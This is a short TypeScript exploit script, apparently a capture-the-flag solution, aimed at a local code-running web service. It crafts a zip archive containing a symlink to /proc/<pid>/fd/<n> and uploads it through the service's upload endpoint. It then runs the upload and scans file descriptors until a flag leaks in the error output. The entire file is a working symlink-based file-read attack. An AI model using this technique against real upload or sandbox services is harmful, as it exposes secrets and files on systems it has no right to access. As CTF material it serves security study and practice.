#!/usr/bin/env -S bun run
// Install JSZip by `bun install jszip` or with other package mananger.
import JSZip from 'jszip';
// The target URL of the challenge, without trailing slash
const TARGET_URI = "http://127.0.0.1:18894"
// The regex to match the flag
const FLAG_REGEX = /flag{.+}/

function createSymlinkZipBlob(pid, fd) {
    const zip = new JSZip();
    zip.file('flag.ts', `/proc/${pid}/fd/${fd}`, {
        unixPermissions: 0o755 | 0o120000, // symlink
    })
    zip.file('entry.ts', "import './flag.ts';\n")
    return zip.generateAsync({ type: 'blob', platform: 'UNIX' })
}

// Collect information
console.log('Fetching status')
let json = await fetch(`${TARGET_URI}/status`).then(r => r.json())
const pid = json.pid
console.log(`[+] PID: ${pid}`)

// Leak
for (let fd = 10; fd <= 20; ++fd) {
    // Create zip
    console.log(`\nCreating zip -> /proc/${pid}/fd/${fd}`)
    const formdata = new FormData()
    const zipBlob = await createSymlinkZipBlob(pid, fd)
    formdata.append('file', zipBlob, 'leak.zip')
    formdata.append('entry', 'entry.ts');

    // Upload
    console.log('Uploading')
    json = await fetch(`${TARGET_URI}/api/upload`, {
        method: 'POST',
        body: formdata
    }).then(r => r.json())
    const uuid = json.data.id

    // Run Code
    console.log(`Running code #${uuid}`)
    json = await fetch(`${TARGET_URI}/api/run/${uuid}`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        }
    }).then(r => r.json())

    // Test if the flag is leaked
    if (FLAG_REGEX.test(json.result.stderr)) {
        const flag = json.result.stderr.match(FLAG_REGEX)[0]
        console.log(`\n[+] Flag: ${flag}`)
        break
    }
}